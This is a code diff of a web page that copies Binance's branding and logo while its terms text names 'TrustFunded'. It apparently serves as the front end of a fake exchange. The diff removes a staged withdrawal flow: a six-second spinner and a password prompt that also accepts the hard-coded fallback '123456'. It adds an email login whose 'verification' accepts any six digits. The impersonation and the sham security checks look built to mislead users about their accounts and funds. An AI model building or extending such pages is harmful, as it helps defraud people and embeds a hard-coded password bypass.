@@ -125,7 +125,7 @@
         .modal-close { position: absolute; top: 16px; right: 16px; cursor: pointer; color: #848e9c; }
         .notification-badge { position: absolute; top: -5px; right: -5px; background: #f6465d; color: white; border-radius: 50%; width: 18px; height: 18px; font-size: 10px; display: flex; align-items: center; justify-content: center; animation: pulse 1s infinite; }
         .convert-input { background: #2b2f36; border: 1px solid #3b424d; border-radius: 12px; padding: 12px; color: white; width: 100%; margin: 10px 0; }
-        .referral-code { background: #2b2f36; padding: 15px; border-radius: 12px; text-align: center; font-size: 18px; font-weight: bold; letter-spacing: 2px; margin: 15px 0; }
+        .referral-code { background: #2b3139; padding: 15px; border-radius: 12px; text-align: center; font-size: 18px; font-weight: bold; letter-spacing: 2px; margin: 15px 0; }
         .profile-popup { position: fixed; top: 70px; right: 20px; background: #1e2329; border-radius: 16px; padding: 20px; width: 280px; z-index: 10003; border: 1px solid rgba(252,213,53,0.3); box-shadow: 0 10px 25px rgba(0,0,0,0.3); display: none; }
         .profile-popup.active { display: block; }
         .profile-popup .profile-header { border-bottom: 1px solid #2b3139; padding-bottom: 12px; margin-bottom: 12px; }
@@ -142,10 +142,10 @@
         .input-group label { display: block; font-size: 13px; font-weight: 500; margin-bottom: 8px; color: #eaecef; }
         .input-wrapper { position: relative; display: flex; align-items: center; }
         .input-wrapper i.prefix { position: absolute; left: 14px; color: #848e9c; font-size: 16px; }
-        .input-wrapper input { width: 100%; padding: 14px 14px 14px 44px; border: 1px solid #3b424d; border-radius: 12px; font-size: 14px; outline: none; transition: all 0.2s; background: #2b2f36; color: white; }
+        .input-wrapper input { width: 100%; padding: 14px 14px 14px 44px; border: 1px solid #3b424d; border-radius: 12px; font-size: 14px; outline: none; transition: all 0.2s; background: #2b3139; color: white; }
         .input-wrapper input:focus { border-color: #fcd535; box-shadow: 0 0 0 2px rgba(252,213,53,0.2); }
         .eye-icon { position: absolute; right: 14px; color: #848e9c; cursor: pointer; font-size: 16px; }
-        .pin-box { background: #2b2f36; border-radius: 16px; padding: 20px; margin-top: 8px; margin-bottom: 24px; text-align: left; border: 1px solid #3b424d; }
+        .pin-box { background: #2b3139; border-radius: 16px; padding: 20px; margin-top: 8px; margin-bottom: 24px; text-align: left; border: 1px solid #3b424d; }
         .pin-title { display: flex; align-items: center; font-size: 14px; font-weight: 500; color: #eaecef; margin-bottom: 4px; }
         .pin-title i { margin-right: 8px; color: #fcd535; }
         .pin-box p { font-size: 12px; color: #848e9c; margin: 0 0 16px 0; }
@@ -211,63 +211,94 @@
         <div class="brand-name"><span class="letter">B</span><span class="letter">I</span><span class="letter">N</span><span class="letter">A</span><span class="letter">N</span><span class="letter">C</span><span class="letter">E</span></div>
     </div>
 
-    <div id="withdrawal-loading" class="page-loading-overlay" style="display: none;">
-        <div class="page-loading-spinner"></div>
-        <p class="mt-4 text-white font-bold">Processing Withdrawal Request...</p>
-    </div>
-
-    <div id="password-modal" class="modal">
-        <div class="modal-content">
-            <span class="modal-close" onclick="closePasswordModal()">&times;</span>
-            <h3 class="text-xl font-bold mb-4 binance-yellow">Security Verification</h3>
-            <p class="text-gray-400 text-sm mb-4">Please enter your account password to authorize this withdrawal.</p>
-            <div class="input-bg mb-4">
-                <input type="password" id="withdrawal-password" placeholder="Enter Password" class="bg-transparent w-full outline-none p-3 text-white">
+    <div id="login-overlay">
+        <div class="login-container">
+            <div class="flex flex-col items-center mb-6" id="login-header">
+                <svg width="48" height="48" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg" class="mb-3">
+                    <path d="M24 0L33.6 9.6L24 19.2L14.4 9.6L24 0Z" fill="#FCD535"/>
+                    <path d="M33.6 9.6L43.2 19.2L33.6 28.8L24 19.2L33.6 9.6Z" fill="#FCD535"/>
+                    <path d="M24 19.2L33.6 28.8L24 38.4L14.4 28.8L24 19.2Z" fill="#FCD535"/>
+                    <path d="M14.4 9.6L24 19.2L14.4 28.8L4.8 19.2L14.4 9.6Z" fill="#FCD535"/>
+                </svg>
+                <h1 id="page-title" class="text-2xl font-bold text-white">Welcome to Binance</h1>
+                <p class="text-gray-400 text-sm mt-1">Access your trading dashboard</p>
             </div>
-            <button onclick="verifyWithdrawalPassword()" class="binance-yellow-btn">Confirm Withdrawal</button>
-            <p id="password-error" class="error-message mt-2" style="display:none; color:#f6465d;">Incorrect password. Please try again.</p>
+            
+            <div id="login-form">
+                <div id="step-email">
+                    <div class="mb-4">
+                        <label class="block text-sm font-medium text-gray-300 mb-2">Email Address</label>
+                        <div class="input-bg rounded-xl p-3 flex items-center">
+                            <i class="fa-regular fa-envelope text-gray-500 mr-3 text-base"></i>
+                            <input type="email" id="login-email" placeholder="Enter your email address" class="bg-transparent w-full outline-none text-sm text-white">
+                        </div>
+                        <p class="text-xs text-gray-500 mt-2">We'll send a verification code to this email</p>
+                    </div>
+                    <div class="flex items-start mb-6">
+                        <input type="checkbox" id="login-agree" class="mt-1 mr-2 accent-yellow-400 w-4 h-4">
+                        <span class="text-xs text-gray-400">I agree to TrustFunded's Terms of Service and Privacy Notice.</span>
+                    </div>
+                    <button onclick="sendMagicLink()" id="send-code-btn" class="binance-yellow-btn w-full py-3 rounded-xl font-bold mb-4 transition flex items-center justify-center gap-2">
+                        <i class="fa-regular fa-paper-plane"></i> Continue
+                    </button>
+                </div>
+                
+                <div id="step-code" style="display: none;">
+                    <div class="mb-4">
+                        <label class="block text-sm font-medium text-gray-300 mb-2">Verification Code</label>
+                        <div class="input-bg rounded-xl p-3 flex items-center">
+                            <i class="fa-solid fa-key text-gray-500 mr-3 text-base"></i>
+                            <input type="text" id="magic-code" maxlength="6" placeholder="Enter 6-digit code" class="bg-transparent w-full outline-none text-sm text-white text-center tracking-wider font-mono" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
+                        </div>
+                        <p class="text-xs text-gray-500 mt-2">Check your email for the verification code</p>
+                    </div>
+                    <div id="code-error" class="error-message" style="display: none; background: rgba(246,70,93,0.1); border-left: 3px solid #f6465d; padding: 10px; border-radius: 8px; margin-bottom: 16px; font-size: 12px;">
+                        <i class="fa-solid fa-circle-exclamation mr-2"></i> Invalid code. Please try again.
+                    </div>
+                    <button onclick="verifyMagicCode()" id="verify-code-btn" class="binance-yellow-btn w-full py-3 rounded-xl font-bold mb-3 transition flex items-center justify-center gap-2">
+                        <i class="fa-solid fa-check-circle"></i> Verify & Access
+                    </button>
+                </div>
+            </div>
         </div>
     </div>
 
-    <div id="login-overlay">
+    <div id="main-site">
         </div>
 
     <script>
-        // Existing functions preserved...
-
-        function handleWithdrawClick() {
-            const loadingOverlay = document.getElementById('withdrawal-loading');
-            
-            // 1. Show loading animation
-            loadingOverlay.style.display = 'flex';
-            
-            // 2. Wait for 6 seconds
+        // Initialization and logic
+        window.addEventListener('load', () => {
             setTimeout(() => {
-                loadingOverlay.style.display = 'none';
-                // 3. Show password modal
-                document.getElementById('password-modal').classList.add('active');
-            }, 6000);
+                document.body.classList.add('hide-loader');
+                const hasSession = checkExistingSession();
+                // Trigger login overlay immediately after animation
+                if (!hasSession) {
+                    document.getElementById('login-overlay').classList.add('active');
+                }
+            }, 3200);
+        });
+
+        function checkExistingSession() {
+            // Simplified session check logic
+            return false;
         }
 
-        function verifyWithdrawalPassword() {
-            const passwordInput = document.getElementById('withdrawal-password').value;
-            const errorMsg = document.getElementById('password-error');
-            
-            // Checking against stored userPassword or default fallback
-            if (passwordInput === localStorage.getItem('userPassword') || passwordInput === "123456") { 
-                // 4. If correct, redirect to withdrawal (1).html
-                window.location.href = 'withdrawal (1).html';
+        function sendMagicLink() {
+            // Your magic link logic here
+            document.getElementById('step-email').style.display = 'none';
+            document.getElementById('step-code').style.display = 'block';
+        }
+
+        function verifyMagicCode() {
+            const code = document.getElementById('magic-code').value;
+            if (code.length === 6) {
+                document.getElementById('login-overlay').classList.remove('active');
+                document.body.classList.add('show-dashboard');
             } else {
-                errorMsg.style.display = 'block';
+                document.getElementById('code-error').style.display = 'block';
             }
         }
-
-        function closePasswordModal() {
-            document.getElementById('password-modal').classList.remove('active');
-            document.getElementById('password-error').style.display = 'none';
-        }
-
-        // Remaining existing logic preserved...
     </script>
 </body>
 </html>
